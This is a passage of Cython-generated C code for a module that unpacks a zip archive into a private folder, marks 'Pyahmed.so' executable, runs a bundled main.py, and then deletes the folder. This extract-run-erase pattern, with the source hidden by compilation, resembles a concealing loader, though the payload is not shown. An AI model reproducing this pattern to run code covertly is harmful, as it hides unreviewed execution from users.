    __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L17_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __pyx_t_2;
    __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_8, &__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_7);
        /*try:*/ {
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_zip_ref, __pyx_t_3) < 0) __PYX_ERR(0, 34, __pyx_L21_error)
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_zip_ref); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 35, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_extractall); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 35, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 35, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        goto __pyx_L26_try_end;
        __pyx_L21_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_3, &__pyx_t_1) < 0) __PYX_ERR(0, 34, __pyx_L23_except_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_10 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 34, __pyx_L23_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_10, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 34, __pyx_L23_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (__pyx_t_4 < 0) __PYX_ERR(0, 34, __pyx_L23_except_error)
          __pyx_t_5 = ((!(__pyx_t_4 != 0)) != 0);
          if (__pyx_t_5) {
            __Pyx_GIVEREF(__pyx_t_2);
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_XGIVEREF(__pyx_t_1);
            __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_3, __pyx_t_1);
            __pyx_t_2 = 0; __pyx_t_3 = 0; __pyx_t_1 = 0; 
            __PYX_ERR(0, 34, __pyx_L23_except_error)
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          goto __pyx_L22_exception_handled;
        }
        __pyx_L23_except_error:;
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_8, __pyx_t_7);
        goto __pyx_L1_error;
        __pyx_L22_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_8, __pyx_t_7);
        __pyx_L26_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_6) {
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__5, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 34, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        goto __pyx_L20;
      }
      __pyx_L20:;
    }
    goto __pyx_L30;
    __pyx_L17_error:;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L1_error;
    __pyx_L30:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_join); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_3);
  __Pyx_INCREF(__pyx_kp_u_Pyahmed_so);
  __Pyx_GIVEREF(__pyx_kp_u_Pyahmed_so);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_Pyahmed_so);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_2, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pyahmed_path, __pyx_t_3) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_chmod); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_pyahmed_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_3);
  __Pyx_INCREF(__pyx_int_493);
  __Pyx_GIVEREF(__pyx_int_493);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_int_493);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_1, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_join); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1);
  __Pyx_INCREF(__pyx_kp_u_main___py);
  __Pyx_GIVEREF(__pyx_kp_u_main___py);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_main___py);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Do_Not, __pyx_t_1) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_8);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_run); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Do_Not); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = PyList_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_INCREF(__pyx_n_u_python);
      __Pyx_GIVEREF(__pyx_n_u_python);
      PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_u_python);
      __Pyx_GIVEREF(__pyx_t_1);
      PyList_SET_ITEM(__pyx_t_3, 1, __pyx_t_1);
      __pyx_t_1 = 0;
      __pyx_t_1 = PyTuple_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GIVEREF(__pyx_t_3);
      PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_3);
      __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_check, Py_True) < 0) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_10);
      if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_cwd, __pyx_t_10) < 0) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 42, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_shutil); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 43, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_rmtree); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 43, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 43, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L31_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    goto __pyx_L36_try_end;
    __pyx_L31_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __Pyx_ErrFetch(&__pyx_t_1, &__pyx_t_10, &__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L33_except_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_CalledProcessError); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 44, __pyx_L33_except_error)
    __Pyx_GOTREF(__pyx_t_12);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_13 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_1, __pyx_t_12);
    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_ErrRestore(__pyx_t_1, __pyx_t_10, __pyx_t_3);
    __pyx_t_1 = 0; __pyx_t_10 = 0; __pyx_t_3 = 0;
    if (__pyx_t_13) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_10, &__pyx_t_1) < 0) __PYX_ERR(0, 44, __pyx_L33_except_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_t_10) < 0) __PYX_ERR(0, 44, __pyx_L33_except_error)
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_e); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 45, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_shutil); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_rmtree); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 46, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_14 = __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_2); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 46, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 44, __pyx_L33_except_error) }
          goto __pyx_L43;
        }
        __pyx_L42_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_9 = 0; __pyx_t_11 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_18, &__pyx_t_19, &__pyx_t_20);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_9, &__pyx_t_11, &__pyx_t_17) < 0)) __Pyx_ErrFetch(&__pyx_t_9, &__pyx_t_11, &__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_9);
          __Pyx_XGOTREF(__pyx_t_11);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_19);
          __Pyx_XGOTREF(__pyx_t_20);
          __pyx_t_13 = __pyx_lineno; __pyx_t_15 = __pyx_clineno; __pyx_t_16 = __pyx_filename;
          {
            if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 44, __pyx_L47_error) }
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_XGIVEREF(__pyx_t_19);
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_19, __pyx_t_20);
          }
          __Pyx_XGIVEREF(__pyx_t_9);
          __Pyx_XGIVEREF(__pyx_t_11);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_ErrRestore(__pyx_t_9, __pyx_t_11, __pyx_t_17);
          __pyx_t_9 = 0; __pyx_t_11 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0;
          __pyx_lineno = __pyx_t_13; __pyx_clineno = __pyx_t_15; __pyx_filename = __pyx_t_16;
          goto __pyx_L33_except_error;
          __pyx_L47_error:;
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_XGIVEREF(__pyx_t_19);
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_19, __pyx_t_20);
          }
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0;
          goto __pyx_L33_except_error;
        }
        __pyx_L43:;
      }
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L32_exception_handled;
    }
    goto __pyx_L33_except_error;
    __pyx_L33_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
    goto __pyx_L1_error;
    __pyx_L32_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
    __pyx_L36_try_end:;
  }

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_14);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
